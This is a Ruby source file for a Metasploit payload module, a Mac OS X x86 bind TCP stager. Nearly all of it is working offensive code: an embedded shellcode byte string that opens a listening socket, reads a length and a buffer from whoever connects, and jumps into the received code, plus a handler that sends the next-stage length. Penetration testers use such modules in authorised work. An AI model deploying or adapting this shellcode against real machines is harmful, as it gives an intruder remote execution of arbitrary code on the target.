##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# BindTcp
# -------
#
# Mac OS X x86 bind TCP stager.
#
###
module MetasploitModule
  CachedSize = 144

  include Msf::Payload::Stager

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name'	=> 'Bind TCP Stager',
        'Description'	=> 'Listen, read length, read buffer, execute',
        'Author'	=> 'ddz',
        'License'	=> MSF_LICENSE,
        'Platform'	=> 'osx',
        'Arch'	=> ARCH_X86,
        'Handler'	=> Msf::Handler::BindTcp,
        'Convention'	=> 'sockedi',
        'Stager' => {
          'Offsets' => { 'LPORT' => [ 27, 'n'] },
          'Payload' =>
                     "\x31\xc0\x99\x50\x40\x50\x40\x50" \
                     "\x52\xb0\x61\xcd\x80\x0f\x82\x7d" \
                     "\x00\x00\x00\x89\xc6\x52\x52\x52" \
                     "\x68\x00\x02\x34\x12\x89\xe3\x6a" \
                     "\x10\x53\x56\x52\xb0\x68\xcd\x80" \
                     "\x72\x66\x52\x56\x52\xb0\x6a\xcd" \
                     "\x80\x72\x5d\x52\x52\x56\x52\xb0" \
                     "\x1e\xcd\x80\x72\x53\x89\xc7\x89" \
                     "\xe5\x83\xec\x08\x31\xc9\xf7\xe1" \
                     "\x51\x89\xe6\xb0\x04\x50\x56\x57" \
                     "\x50\x48\xcd\x80\x72\x3a\x8b\x74" \
                     "\x24\x10\x31\xc0\x50\x50\x48\x50" \
                     "\x40\x66\xb8\x02\x10\x50\x31\xc0" \
                     "\xb0\x07\x50\x56\x52\x52\xb0\xc5" \
                     "\xcd\x80\x72\x1c\x89\xc3\x01\xf3" \
                     "\x56\x89\xd8\x29\xf0\x50\x57\x52" \
                     "\x31\xc0\xb0\x03\xcd\x80\x72\x08" \
                     "\x29\xc3\x29\xc6\x75\xea\xff\xe3"
        }
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    #
    # Our stager payload expects to see a next-stage length first.
    #
    conn.put([payload.length].pack('V'))
  end
end
